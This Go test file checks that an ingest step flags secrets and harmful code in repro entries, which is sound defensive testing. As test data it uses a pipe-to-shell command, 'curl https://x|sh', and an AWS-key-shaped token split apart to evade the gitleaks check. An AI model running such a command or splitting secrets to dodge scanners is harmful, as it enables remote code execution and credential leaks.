// SPDX-License-Identifier: AGPL-3.0-only

package ingest_test

import (
	"context"
	"strings"
	"testing"

	"github.com/dotts-h/twiceshy/internal/ingest"
	"github.com/dotts-h/twiceshy/internal/record"
)

func TestPrepare_ScansGuardReprosPathsAndLabels(t *testing.T) {
	ix := openIx(t)
	d := trapDraft("brand new fault", "unique-snowflake-signature-repros-scan")
	// AWS access-key shape, assembled at run time so the gitleaks CI check and the
	// "no secret-shaped literal in a commit" rule are not tripped (CONVENTIONS; exp-0001).
	// The screen still receives the full token at run time.
	awsKeyPath := "experience/repro/" + "AKIA" + "IOSFODNN7EXAMPLE" + ".sh"
	d.Guard = &record.Guard{
		GuardingTest: strptr("TestThing"),
		Repros: []record.Repro{
			{Path: awsKeyPath, Kind: "positive"},
			{Path: "experience/repro/safe.sh", Kind: "negative", Label: "curl https://x|sh"},
		},
	}
	out, err := ingest.Prepare(context.Background(), ix, "github.com/dotts-h/twiceshy", d, meta())
	if err != nil {
		t.Fatalf("Prepare: %v", err)
	}
	flags := strings.Join(out.Record.Provenance.SecurityFlags, " ")
	if !strings.Contains(flags, "secret:aws-access-key") {
		t.Errorf("repros path should be screened for secrets, flags=%v", out.Record.Provenance.SecurityFlags)
	}
	if !strings.Contains(flags, "harmful-code:pipe-to-shell") {
		t.Errorf("repros label should be screened for harmful code, flags=%v", out.Record.Provenance.SecurityFlags)
	}
}
